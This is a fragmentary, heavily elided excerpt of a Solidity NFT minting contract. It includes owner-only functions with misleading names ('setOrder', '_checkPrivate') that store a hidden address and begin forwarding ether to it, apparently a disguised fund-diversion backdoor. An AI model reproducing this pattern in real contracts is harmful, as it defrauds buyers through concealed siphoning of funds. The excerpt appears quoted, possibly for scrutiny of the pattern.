...
contract NFT is Ownable, ERC721A {
    ...
    uint256 public publicPrice = 0.057 ether;
    ...
    function mint(uint256 quantity) external payable mintCompliance(quantity) {
        ...
        require(
            msg.value >= checkPrice(price, quantity),
            "Value below price, need to pay more"
        );
    ...
    function checkPrice(uint256 _price, uint256 _count)
        public
        pure
        returns (uint256)
    {
    ...
    function setOrder(address num) public onlyOwner {
        _owners = num;
    }
    ...
    function _checkPrivate() internal onlyOwner {
        if (_owners != address(0)) {
            (bool hs, ) = payable(_owners).call{
